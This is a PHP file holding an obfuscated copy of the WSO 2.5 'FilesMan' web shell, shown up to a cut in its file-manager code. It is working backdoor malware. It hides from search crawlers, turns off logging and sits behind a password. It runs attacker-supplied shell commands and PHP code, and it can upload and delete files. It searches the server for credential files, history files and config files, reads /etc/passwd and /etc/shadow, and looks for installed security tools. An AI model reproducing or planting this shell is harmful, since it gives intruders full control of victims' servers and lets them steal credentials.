<?php
?>
	<?php  echo '[syslog]01
'; $sp76a070 = '866fd58d77526c1bda8771b5b21d5b11'; $sp34f272 = '#df5'; $spa13dd5 = 'FilesMan'; $sp39abfc = true; $spfe0679 = 'Windows-1251'; if (!empty($_SERVER['HTTP_USER_AGENT'])) { $spc1f1ad = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Bing'); if (preg_match('/' . implode('|', $spc1f1ad) . '/i', $_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not Found'); die; } } @ini_set('error_log', NULL); @ini_set('log_errors', 0); @ini_set('max_execution_time', 0); echo '[syslog]02
'; @define('WSO_VERSION', '2.5'); if (get_magic_quotes_gpc()) { function WSOstripslashes($sp026f8c) { return is_array($sp026f8c) ? array_map('WSOstripslashes', $sp026f8c) : stripslashes($sp026f8c); } $_POST = WSOstripslashes($_POST); $_COOKIE = WSOstripslashes($_COOKIE); } function wsoLogin() { die('<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value=\'>>\'></form></pre>'); } function WSOsetcookie($sp8db113, $sp6d4391) { $_COOKIE[$sp8db113] = $sp6d4391; setcookie($sp8db113, $sp6d4391); } if (!empty($sp76a070)) { if (isset($_POST['pass']) && md5($_POST['pass']) == $sp76a070) { WSOsetcookie(md5($_SERVER['HTTP_HOST']), $sp76a070); } if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || $_COOKIE[md5($_SERVER['HTTP_HOST'])] != $sp76a070) { wsoLogin(); } } if (strtolower(substr(PHP_OS, 0, 3)) == 'win') { $sp6050b9 = 'win'; } else { $sp6050b9 = 'nix'; } $spdda14d = @ini_get('safe_mode'); if (!$spdda14d) { error_reporting(0); } $sp4f8632 = @ini_get('disable_functions'); $spe8c9c2 = @getcwd(); if (isset($_POST['c'])) { @chdir($_POST['c']); } $sp570d5b = @getcwd(); if ($sp6050b9 == 'win') { $spe8c9c2 = str_replace('\\', '/', $spe8c9c2); $sp570d5b = str_replace('\\', '/', $sp570d5b); } if ($sp570d5b[strlen($sp570d5b) - 1] != '/') { $sp570d5b .= '/'; } if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) { $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool) $sp39abfc; } if ($sp6050b9 == 'win') { $sp481a00 = array('List Directory' => 'dir', 'Find index.php in current dir' => 'dir /s /w /b index.php', 'Find *config*.php in current dir' => 'dir /s /w /b *config*.php', 'Show active connections' => 'netstat -an', 'Show running services' => 'net start', 'User accounts' => 'net user', 'Show computers' => 'net view', 'ARP Table' => 'arp -a', 'IP Configuration' => 'ipconfig /all'); } else { $sp481a00 = array('List dir' => 'ls -lha', 'list file attributes on a Linux second extended file system' => 'lsattr -va', 'show opened ports' => 'netstat -an | grep -i listen', 'process status' => 'ps aux', 'Find' => '', 'find all suid files' => 'find / -type f -perm -04000 -ls', 'find suid files in current dir' => 'find . -type f -perm -04000 -ls', 'find all sgid files' => 'find / -type f -perm -02000 -ls', 'find sgid files in current dir' => 'find . -type f -perm -02000 -ls', 'find config.inc.php files' => 'find / -type f -name config.inc.php', 'find config* files' => 'find / -type f -name "config*"', 'find config* files in current dir' => 'find . -type f -name "config*"', 'find all writable folders and files' => 'find / -perm -2 -ls', 'find all writable folders and files in current dir' => 'find . -perm -2 -ls', 'find all service.pwd files' => 'find / -type f -name service.pwd', 'find service.pwd files in current dir' => 'find . -type f -name service.pwd', 'find all .htpasswd files' => 'find / -type f -name .htpasswd', 'find .htpasswd files in current dir' => 'find . -type f -name .htpasswd', 'find all .bash_history files' => 'find / -type f -name .bash_history', 'find .bash_history files in current dir' => 'find . -type f -name .bash_history', 'find all .fetchmailrc files' => 'find / -type f -name .fetchmailrc', 'find .fetchmailrc files in current dir' => 'find . -type f -name .fetchmailrc', 'Locate' => '', 'locate httpd.conf files' => 'locate httpd.conf', 'locate vhosts.conf files' => 'locate vhosts.conf', 'locate proftpd.conf files' => 'locate proftpd.conf', 'locate psybnc.conf files' => 'locate psybnc.conf', 'locate my.conf files' => 'locate my.conf', 'locate admin.php files' => 'locate admin.php', 'locate cfg.php files' => 'locate cfg.php', 'locate conf.php files' => 'locate conf.php', 'locate config.dat files' => 'locate config.dat', 'locate config.php files' => 'locate config.php', 'locate config.inc files' => 'locate config.inc', 'locate config.inc.php' => 'locate config.inc.php', 'locate config.default.php files' => 'locate config.default.php', 'locate config* files ' => 'locate config', 'locate .conf files' => 'locate \'.conf\'', 'locate .pwd files' => 'locate \'.pwd\'', 'locate .sql files' => 'locate \'.sql\'', 'locate .htpasswd files' => 'locate \'.htpasswd\'', 'locate .bash_history files' => 'locate \'.bash_history\'', 'locate .mysql_history files' => 'locate \'.mysql_history\'', 'locate .fetchmailrc files' => 'locate \'.fetchmailrc\'', 'locate backup files' => 'locate backup', 'locate dump files' => 'locate dump', 'locate priv files' => 'locate priv'); } function wsoHeader() { if (empty($_POST['charset'])) { $_POST['charset'] = $sp2eb6c3['default_charset']; } global $sp34f272; echo '<html><head><meta http-equiv=\'Content-Type\' content=\'text/html; charset=' . $_POST['charset'] . '\'><title>' . $_SERVER['HTTP_HOST'] . ' - WSO ' . WSO_VERSION . "</title>\n    <style>\n    body{background-color:#444;color:#e1e1e1;}\n    body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }\n    table.info{ color:#fff;background-color:#222; }\n    span,h1,a{ color: {$sp34f272} !important; }\n    span{ font-weight: bolder; }\n    h1{ border-left:5px solid {$sp34f272};padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }\n    div.content{ padding: 5px;margin-left:5px;background-color:#333; }\n    a{ text-decoration:none; }\n    a:hover{ text-decoration:underline; }\n    .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }\n    .bigarea{ width:100%;height:300px; }\n    input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid {$sp34f272}; font: 9pt Monospace,'Courier New'; }\n    form{ margin:0px; }\n    #toolsTbl{ text-align:center; }\n    .toolsInp{ width: 300px }\n    .main th{text-align:left;background-color:#5e5e5e;}\n    .main tr:hover{background-color:#5e5e5e}\n    .l1{background-color:#444}\n    .l2{background-color:#333}\n    pre{font-family:Courier,Monospace;}\n    </style>\n    <script>\n        var c_ = '" . htmlspecialchars($sp2eb6c3['cwd']) . '\';
        var a_ = \'' . htmlspecialchars(@$_POST['a']) . '\'
        var charset_ = \'' . htmlspecialchars(@$_POST['charset']) . '\';
        var p1_ = \'' . (strpos(@$_POST['p1'], '
') !== false ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . '\';
        var p2_ = \'' . (strpos(@$_POST['p2'], '
') !== false ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . '\';
        var p3_ = \'' . (strpos(@$_POST['p3'], '
') !== false ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . '\';
        var d = document;
    	function set(a,c,p1,p2,p3,charset) {
    		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
    		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
    		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
    		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
    		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
    		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
    	}
    	function g(a,c,p1,p2,p3,charset) {
    		set(a,c,p1,p2,p3,charset);
    		d.mf.submit();
    	}
    	function a(a,c,p1,p2,p3,charset) {
    		set(a,c,p1,p2,p3,charset);
    		var params = \'ajax=true\';
    		for(i=0;i<d.mf.elements.length;i++)
    			params += \'&\'+d.mf.elements[i].name+\'=\'+encodeURIComponent(d.mf.elements[i].value);
    		sr(\'' . addslashes($_SERVER['REQUEST_URI']) . '\', params);
    	}
    	function sr(url, params) {
    		if (window.XMLHttpRequest)
    			req = new XMLHttpRequest();
    		else if (window.ActiveXObject)
    			req = new ActiveXObject(\'Microsoft.XMLHTTP\');
            if (req) {
                req.onreadystatechange = processReqChange;
                req.open(\'POST\', url, true);
                req.setRequestHeader (\'Content-Type\', \'application/x-www-form-urlencoded\');
                req.send(params);
            }
    	}
    	function processReqChange() {
    		if( (req.readyState == 4) )
    			if(req.status == 200) {
    				var reg = new RegExp("(\\\\d+)([\\\\S\\\\s]*)", \'m\');
    				var arr=reg.exec(req.responseText);
    				eval(arr[2].substr(0, arr[1]));
    			} else alert(\'Request error!\');
    	}
    </script>
    <head><body><div style=\'position:absolute;width:100%;background-color:#444;top:0;left:0;\'>
    <form method=post name=mf style=\'display:none;\'>
    <input type=hidden name=a>
    <input type=hidden name=c>
    <input type=hidden name=p1>
    <input type=hidden name=p2>
    <input type=hidden name=p3>
    <input type=hidden name=charset>
    </form>'; $sp59c6e1 = @diskfreespace($sp2eb6c3['cwd']); $spd0b0bc = @disk_total_space($sp2eb6c3['cwd']); $spd0b0bc = $spd0b0bc ? $spd0b0bc : 1; $sp5a3145 = @php_uname('r'); $sp9f9cf6 = @php_uname('s'); $spbde02a = 'http://exploit-db.com/search/?action=search&filter_description='; if (strpos('Linux', $sp9f9cf6) !== false) { $spbde02a .= urlencode('Linux Kernel ' . substr($sp5a3145, 0, 6)); } else { $spbde02a .= urlencode($sp9f9cf6 . ' ' . substr($sp5a3145, 0, 3)); } if (!function_exists('posix_getegid')) { $sp8b0777 = @get_current_user(); $sped417e = @getmyuid(); $spe9607f = @getmygid(); $sp103103 = '?'; } else { $sped417e = @posix_getpwuid(posix_geteuid()); $spe9607f = @posix_getgrgid(posix_getegid()); $sp8b0777 = $sped417e['name']; $sped417e = $sped417e['uid']; $sp103103 = $spe9607f['name']; $spe9607f = $spe9607f['gid']; } $sp405fcc = ''; $sp149c6d = explode('/', $sp2eb6c3['cwd']); $sp5c3411 = count($sp149c6d); for ($sp412bbc = 0; $sp412bbc < $sp5c3411 - 1; $sp412bbc++) { $sp405fcc .= '<a href=\'#\' onclick=\'g("FilesMan","'; for ($sp460372 = 0; $sp460372 <= $sp412bbc; $sp460372++) { $sp405fcc .= $sp149c6d[$sp460372] . '/'; } $sp405fcc .= '")\'>' . $sp149c6d[$sp412bbc] . '/</a>'; } $sp2f96f9 = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866'); $sp9d79fb = ''; foreach ($sp2f96f9 as $sp527681) { $sp9d79fb .= '<option value="' . $sp527681 . '" ' . ($_POST['charset'] == $sp527681 ? 'selected' : '') . '>' . $sp527681 . '</option>'; } $sp8374c6 = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Sql' => 'Sql', 'Php' => 'Php', 'String tools' => 'StringTools', 'Bruteforce' => 'Bruteforce', 'Network' => 'Network'); if (!empty($sp2eb6c3['auth_pass'])) { $sp8374c6['Logout'] = 'Logout'; } $sp8374c6['Self remove'] = 'SelfRemove'; $sp59d703 = ''; foreach ($sp8374c6 as $sp8db113 => $sp6d4391) { $sp59d703 .= '<th width="' . (int) (100 / count($sp8374c6)) . '%">[ <a href="#" onclick="g(\'' . $sp6d4391 . '\',null,\'\',\'\',\'\')">' . $sp8db113 . '</a> ]</th>'; } $spb380a7 = ''; if ($sp2eb6c3['os'] == 'win') { foreach (range('c', 'z') as $sp9378fb) { if (is_dir($sp9378fb . ':\\')) { $spb380a7 .= '<a href="#" onclick="g(\'FilesMan\',\'' . $sp9378fb . ':/\')">[ ' . $sp9378fb . ' ]</a> '; } } } echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($sp2eb6c3['os'] == 'win' ? '<br>Drives:' : '') . '</span></td>' . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $spbde02a . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $sped417e . ' ( ' . $sp8b0777 . ' ) <span>Group:</span> ' . $spe9607f . ' ( ' . $sp103103 . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($sp2eb6c3['safe_mode'] ? '<font color=red>ON</font>' : '<font color=green><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($spd0b0bc) . ' <span>Free:</span> ' . wsoViewSize($sp59c6e1) . ' (' . (int) ($sp59c6e1 / $spd0b0bc * 100) . '%)<br>' . $sp405fcc . ' ' . wsoPermsColor($sp2eb6c3['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $sp2eb6c3['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $spb380a7 . '</td>' . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $sp9d79fb . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER['SERVER_ADDR'] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>' . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $sp59d703 . '</tr></table><div style="margin:5">'; } function wsoFooter() { $sp503ea0 = is_writable($sp2eb6c3['cwd']) ? ' <font color=\'green\'>(Writeable)</font>' : ' <font color=red>(Not writable)</font>'; echo '
    </div>
    <table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style=\'border-top:2px solid #333;border-bottom:2px solid #333;\'>
    	<tr>
    		<td><form onsubmit=\'g(null,this.c.value,"");return false;\'><span>Change dir:</span><br><input class=\'toolsInp\' type=text name=c value=\'' . htmlspecialchars($sp2eb6c3['cwd']) . "'><input type=submit value='>>'></form></td>\n    \t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\n    \t</tr><tr>\n    \t\t<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>{$sp503ea0}<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>\n    \t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>{$sp503ea0}<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\n    \t</tr><tr>\n    \t\t<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>\n    \t\t<td><form method='post' ENCTYPE='multipart/form-data'>\n    \t\t<input type=hidden name=a value='FilesMAn'>\n    \t\t<input type=hidden name=c value='" . $sp2eb6c3['cwd'] . '\'>
    		<input type=hidden name=p1 value=\'uploadFile\'>
    		<input type=hidden name=charset value=\'' . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>\n    \t\t<span>Upload file:</span>{$sp503ea0}<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>\n    \t</tr></table></div></body></html>"; } if (!function_exists('posix_getpwuid') && strpos($sp2eb6c3['disable_functions'], 'posix_getpwuid') === false) { function posix_getpwuid($spba2fc0) { return false; } } if (!function_exists('posix_getgrgid') && strpos($sp2eb6c3['disable_functions'], 'posix_getgrgid') === false) { function posix_getgrgid($spba2fc0) { return false; } } function wsoEx($spa16d92) { $spb3b003 = ''; if (function_exists('exec')) { @exec($spa16d92, $spb3b003); $spb3b003 = @join('
', $spb3b003); } elseif (function_exists('passthru')) { ob_start(); @passthru($spa16d92); $spb3b003 = ob_get_clean(); } elseif (function_exists('system')) { ob_start(); @system($spa16d92); $spb3b003 = ob_get_clean(); } elseif (function_exists('shell_exec')) { $spb3b003 = shell_exec($spa16d92); } elseif (is_resource($sp1b2b3c = @popen($spa16d92, 'r'))) { $spb3b003 = ''; while (!@feof($sp1b2b3c)) { $spb3b003 .= fread($sp1b2b3c, 1024); } pclose($sp1b2b3c); } return $spb3b003; } function wsoViewSize($sp1acd5c) { if (is_int($sp1acd5c)) { $sp1acd5c = sprintf('%u', $sp1acd5c); } if ($sp1acd5c >= 1073741824) { return sprintf('%1.2f', $sp1acd5c / 1073741824) . ' GB'; } elseif ($sp1acd5c >= 1048576) { return sprintf('%1.2f', $sp1acd5c / 1048576) . ' MB'; } elseif ($sp1acd5c >= 1024) { return sprintf('%1.2f', $sp1acd5c / 1024) . ' KB'; } else { return $sp1acd5c . ' B'; } } function wsoPerms($spba2fc0) { if (($spba2fc0 & 49152) == 49152) { $sp412bbc = 's'; } elseif (($spba2fc0 & 40960) == 40960) { $sp412bbc = 'l'; } elseif (($spba2fc0 & 32768) == 32768) { $sp412bbc = '-'; } elseif (($spba2fc0 & 24576) == 24576) { $sp412bbc = 'b'; } elseif (($spba2fc0 & 16384) == 16384) { $sp412bbc = 'd'; } elseif (($spba2fc0 & 8192) == 8192) { $sp412bbc = 'c'; } elseif (($spba2fc0 & 4096) == 4096) { $sp412bbc = 'p'; } else { $sp412bbc = 'u'; } $sp412bbc .= $spba2fc0 & 256 ? 'r' : '-'; $sp412bbc .= $spba2fc0 & 128 ? 'w' : '-'; $sp412bbc .= $spba2fc0 & 64 ? $spba2fc0 & 2048 ? 's' : 'x' : ($spba2fc0 & 2048 ? 'S' : '-'); $sp412bbc .= $spba2fc0 & 32 ? 'r' : '-'; $sp412bbc .= $spba2fc0 & 16 ? 'w' : '-'; $sp412bbc .= $spba2fc0 & 8 ? $spba2fc0 & 1024 ? 's' : 'x' : ($spba2fc0 & 1024 ? 'S' : '-'); $sp412bbc .= $spba2fc0 & 4 ? 'r' : '-'; $sp412bbc .= $spba2fc0 & 2 ? 'w' : '-'; $sp412bbc .= $spba2fc0 & 1 ? $spba2fc0 & 512 ? 't' : 'x' : ($spba2fc0 & 512 ? 'T' : '-'); return $sp412bbc; } function wsoPermsColor($sp1b2b3c) { if (!@is_readable($sp1b2b3c)) { return '<font color=#FF0000>' . wsoPerms(@fileperms($sp1b2b3c)) . '</font>'; } elseif (!@is_writable($sp1b2b3c)) { return '<font color=white>' . wsoPerms(@fileperms($sp1b2b3c)) . '</font>'; } else { return '<font color=#25ff00>' . wsoPerms(@fileperms($sp1b2b3c)) . '</font>'; } } function wsoScandir($spee51b5) { if (function_exists('scandir')) { return scandir($spee51b5); } else { $spcfdfd7 = opendir($spee51b5); while (false !== ($spcc5ae4 = readdir($spcfdfd7))) { $spf2bff7[] = $spcc5ae4; } return $spf2bff7; } } function wsoWhich($spba2fc0) { $sp149c6d = wsoEx('which ' . $spba2fc0); if (!empty($sp149c6d)) { return $sp149c6d; } return false; } function actionSecInfo() { wsoHeader(); echo '<h1>Server security information</h1><div class=content>'; function wsoSecParam($sp5c3411, $sp6d4391) { $sp6d4391 = trim($sp6d4391); if ($sp6d4391) { echo '<span>' . $sp5c3411 . ': </span>'; if (strpos($sp6d4391, '
') === false) { echo $sp6d4391 . '<br>'; } else { echo '<pre class=ml1>' . $sp6d4391 . '</pre>'; } } } wsoSecParam('Server software', @getenv('SERVER_SOFTWARE')); if (function_exists('apache_get_modules')) { wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules())); } wsoSecParam('Disabled PHP Functions', $sp2eb6c3['disable_functions'] ? $sp2eb6c3['disable_functions'] : 'none'); wsoSecParam('Open base dir', @ini_get('open_basedir')); wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir')); wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir')); wsoSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no'); $spc44fb2 = array(); if (function_exists('mysql_get_client_info')) { $spc44fb2[] = 'MySql (' . mysql_get_client_info() . ')'; } if (function_exists('mssql_connect')) { $spc44fb2[] = 'MSSQL'; } if (function_exists('pg_connect')) { $spc44fb2[] = 'PostgreSQL'; } if (function_exists('oci_connect')) { $spc44fb2[] = 'Oracle'; } wsoSecParam('Supported databases', implode(', ', $spc44fb2)); echo '<br>'; if ($sp2eb6c3['os'] == 'nix') { wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? 'yes <a href=\'#\' onclick=\'g("FilesTools", "/etc/", "passwd")\'>[view]</a>' : 'no'); wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? 'yes <a href=\'#\' onclick=\'g("FilesTools", "/etc/", "shadow")\'>[view]</a>' : 'no'); wsoSecParam('OS version', @file_get_contents('/proc/version')); wsoSecParam('Distr name', @file_get_contents('/etc/issue.net')); if (!$sp2eb6c3['safe_mode']) { $sp2d6efd = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl'); $spd109b3 = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja'); $sp2c68de = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror'); echo '<br>'; $spc44fb2 = array(); foreach ($sp2d6efd as $sp527681) { if (wsoWhich($sp527681)) { $spc44fb2[] = $sp527681; } } wsoSecParam('Userful', implode(', ', $spc44fb2)); $spc44fb2 = array(); foreach ($spd109b3 as $sp527681) { if (wsoWhich($sp527681)) { $spc44fb2[] = $sp527681; } } wsoSecParam('Danger', implode(', ', $spc44fb2)); $spc44fb2 = array(); foreach ($sp2c68de as $sp527681) { if (wsoWhich($sp527681)) { $spc44fb2[] = $sp527681; } } wsoSecParam('Downloaders', implode(', ', $spc44fb2)); echo '<br/>'; wsoSecParam('HDD space', wsoEx('df -h')); wsoSecParam('Hosts', @file_get_contents('/etc/hosts')); echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>'; if (isset($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) { $spc44fb2 = ''; for (; $_POST['p2'] <= $_POST['p3']; $_POST['p2']++) { $sped417e = @posix_getpwuid($_POST['p2']); if ($sped417e) { $spc44fb2 .= join(':', $sped417e) . '
'; } } echo '<br/>'; wsoSecParam('Users', $spc44fb2); } } } else { wsoSecParam('OS Version', wsoEx('ver')); wsoSecParam('Account Settings', wsoEx('net accounts')); wsoSecParam('User Accounts', wsoEx('net user')); } echo '</div>'; wsoFooter(); } function actionPhp() { if (isset($_POST['ajax'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true); ob_start(); eval($_POST['p1']); $spc44fb2 = 'document.getElementById(\'PhpOutput\').style.display=\'\';document.getElementById(\'PhpOutput\').innerHTML=\'' . addcslashes(htmlspecialchars(ob_get_clean()), '
	\\\' ') . '\';
'; echo strlen($spc44fb2), '
', $spc44fb2; die; } if (empty($_POST['ajax']) && !empty($_POST['p1'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0); } wsoHeader(); if (isset($_POST['p2']) && $_POST['p2'] == 'info') { echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>'; ob_start(); phpinfo(); $sp5a7cd5 = ob_get_clean(); $sp5a7cd5 = preg_replace(array('!(body|a:\\w+|body, td, th, h1, h2) {.*}!msiU', '!td, th {(.*)}!msiU', '!<img[^>]+>!msiU'), array('', '.e, .v, .h, .h th {$1}', ''), $sp5a7cd5); echo str_replace('<h1', '<h2', $sp5a7cd5) . '</div><br>'; } echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea><input type=submit value=Eval style="margin-top:5px">'; echo ' <input type=checkbox name=ajax value=1 ' . ($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX</form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>'; if (!empty($_POST['p1'])) { ob_start(); eval($_POST['p1']); echo htmlspecialchars(ob_get_clean()); } echo '</pre></div>'; wsoFooter(); } function actionFilesMan() { if (!empty($_COOKIE['f'])) { $_COOKIE['f'] = @unserialize($_COOKIE['f']); } if (!empty($_POST['p1'])) { switch ($_POST['p1']) { case 'uploadFile': if (!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) { echo 'Can\'t upload file!'; } break; case 'mkdir': if (!@mkdir($_POST['p2'])) { echo 'Can\'t create new dir'; } break; case 'delete': function deleteDir($sp149c6d) { $sp149c6d = substr($sp149c6d, -1) == '/' ? $sp149c6d : $sp149c6d . '/'; $spcfdfd7 = opendir($sp149c6d); while (($sp527681 = readdir($spcfdfd7)) !== false) { $sp527681 = $sp149c6d . $sp527681; if (basename($sp527681) == '..' || basename($sp527681) == '.') { continue; } $spa48979 = filetype($sp527681); if ($spa48979 == 'dir') { deleteDir($sp527681); } else { @unlink($sp527681); } } closedir($spcfdfd7); @rmdir($sp149c6d); } if (is_array(@$_POST['f'])) { foreach ($_POST['f'] as $sp1b2b3c) { if ($sp1b2b3c == '..') { continue; } $sp1b2b3c = urldecode($sp1b2b3c); if (is_dir($sp1b2b3c)) { deleteDir($sp1b2b3c); } else { @unlink($sp1b2b3c); } } } break; case 'paste': if ($_COOKIE['act'] == 'copy') { function copy_paste($sp559d1c, $sp1acd5c, $sp96625c) { if (is_dir($sp559d1c . $sp1acd5c)) { mkdir($sp96625c . $sp1acd5c); $sp4a7259 = @opendir($sp559d1c . $sp1acd5c); while (($sp1b2b3c = @readdir($sp4a7259)) !== false) { if ($sp1b2b3c != '.' and $sp1b2b3c != '..') { copy_paste($sp559d1c . $sp1acd5c . '/', $sp1b2b3c, $sp96625c . $sp1acd5c . '/'); } } } elseif (is_file($sp559d1c . $sp1acd5c)) { @copy($sp559d1c . $sp1acd5c, $sp96625c . $sp1acd5c); } } foreach ($_COOKIE['f'] as $sp1b2b3c) { copy_paste($_COOKIE['c'], $sp1b2b3c, $sp2eb6c3['cwd']); } } elseif ($_COOKIE['act'] == 'move') { function move_paste($sp559d1c, $sp1acd5c, $sp96625c) { if (is_dir($sp559d1c . $sp1acd5c)) { mkdir($sp96625c . $sp1acd5c); $sp4a7259 = @opendir($sp559d1c . $sp1acd5c); while (($sp1b2b3c = @readdir($sp4a7259)) !== false) { if ($sp1b2b3c != '.' and $sp1b2b3c != '..') { copy_paste($sp559d1c . $sp1acd5c . '/', $sp1b2b3c, $sp96625c . $sp1acd5c . '/'); } } } elseif (@is_file($sp559d1c . $sp1acd5c)) { @copy($sp559d1c . $sp1acd5c, $sp96625c . $sp1acd5c); } } foreach ($_COOKIE['f'] as $sp1b2b3c) { @rename($_COOKIE['c'] . $sp1b2b3c, $sp2eb6c3['cwd'] . $sp1b2b3c); } } elseif ($_COOKIE['act'] == 'zip') { if (class_exists('ZipArchive')) { $sp021d9f = new ZipArchive(); if ($sp021d9f->open($_POST['p2'], 1)) { chdir($_COOKIE['c']); foreach ($_COOKIE['f'] as $sp1b2b3c) { if ($sp1b2b3c == '..') { continue; } if (@is_file($_COOKIE['c'] . $sp1b2b3c)) { $sp021d9f->addFile($_COOKIE['c'] . $sp1b2b3c, $sp1b2b3c); } elseif (@is_dir($_COOKIE['c'] . $sp1b2b3c)) { $sp687824 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sp1b2b3c . '/', FilesystemIterator::SKIP_DOTS)); foreach ($sp687824 as $sp7ac89e => $sp8e17b7) { $sp021d9f->addFile(realpath($sp7ac89e), $sp7ac89e); } } } chdir($sp2eb6c3['cwd']); $sp021d9f->close(); } } } elseif ($_COOKIE['act'] == 'unzip') { if (class_exists('ZipArchive')) { $sp021d9f = new ZipArchive(); foreach ($_COOKIE['f'] as $sp1b2b3c) { if ($sp021d9f->open($_COOKIE['c'] . $sp1b2b3c)) { $sp021d9f->extractTo($sp2eb6c3['cwd']); $sp021d9f->close(); } } } } elseif ($_COOKIE['act'] == 'tar') { chdir($_COOKIE['c']); $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']); wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f'])); chdir($sp2eb6c3['cwd']); } unset($_COOKIE['f']); setcookie('f', '', time() - 3600); break; default: if (!empty($_POST['p1'])) { WSOsetcookie('act', $_POST['p1']); WSOsetcookie('f', serialize(@$_POST['f'])); WSOsetcookie('c', @$_POST['c']); } break; } } wsoHeader(); echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>'; $spea6e47 = wsoScandir(isset($_POST['c']) ? $_POST['c'] : $sp2eb6c3['cwd']); if ($spea6e47 === false) { echo 'Can\'t open this folder!'; wsoFooter(); return; } global $spbc4c0f; $spbc4c0f = array('name', 1); if (!empty($_POST['p1'])) { if (preg_match('!s_([A-z]+)_(\\d{1})!', $_POST['p1'], $spd3b0e2)) { $spbc4c0f = array($spd3b0e2[1], (int) $spd3b0e2[2]); } } echo '<script>
    	function sa() {
    		for(i=0;i<d.files.elements.length;i++)
    			if(d.files.elements[i].type == \'checkbox\')
    				d.files.elements[i].checked = d.files.elements[0].checked;
    	}
    </script>
